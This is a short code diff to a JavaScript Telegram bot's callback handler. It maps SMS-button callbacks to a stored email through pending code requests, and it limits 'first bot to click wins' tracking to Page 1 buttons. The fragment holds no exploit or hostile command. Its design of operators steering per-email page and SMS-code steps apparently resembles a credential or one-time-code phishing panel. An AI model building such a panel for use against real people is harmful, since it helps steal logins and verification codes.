@@ -384,13 +384,19 @@ bot.on("callback_query", async (query) => {
     }
 
     // ============================================================================
-    // ✅ MAIN CALLBACK HANDLER (Page 1 buttons + Page 2 buttons)
+    // ✅ MAIN CALLBACK HANDLER (Page 1 buttons + Page 2 buttons + SMS buttons)
     // ============================================================================
     
-    const email = identifier;
+    let email = identifier;
 
-    // ✅ STEP 1: Set winner on first click (Page 1 only)
-    if (!userWinnerTelegram[email]) {
+    // ✅ For SMS callbacks, extract real email from pendingCodes[requestId]
+    if (action.startsWith("sms_") && pendingCodes && pendingCodes[identifier]) {
+      email = pendingCodes[identifier].email;
+      console.log(`📝 SMS callback: requestId ${identifier} maps to email ${email}`);
+    }
+
+    // ✅ STEP 1: Set winner on first click (Page 1 only - don't set for SMS!)
+    if (!userWinnerTelegram[email] && !action.startsWith("sms_")) {
       userWinnerTelegram[email] = "telegram1";  // Bot 1 wins (first to click)
       botsThatClickedPage1[email] = true;
       botsThatClickedPage1[`${email}_timestamp`] = Date.now();
